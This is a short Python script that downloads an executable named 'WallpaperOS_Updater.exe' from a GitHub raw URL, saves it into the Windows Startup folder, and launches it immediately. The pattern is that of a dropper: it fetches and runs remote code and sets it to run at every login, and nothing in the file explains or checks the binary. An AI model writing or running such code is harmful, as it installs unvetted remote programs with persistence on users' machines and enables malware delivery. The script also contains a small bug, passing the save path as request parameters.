import requests
import os

path = os.path.expanduser('~') +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
response = requests.get("https://raw.githubusercontent.com/dkaloger/AIwallpaperimages/main/WallpaperOS_Updater.exe", path+"/WallpaperOS_Updater.exe")
open(path+"/WallpaperOS_Updater.exe", "wb").write(response.content)
os.startfile(path+"/WallpaperOS_Updater.exe")





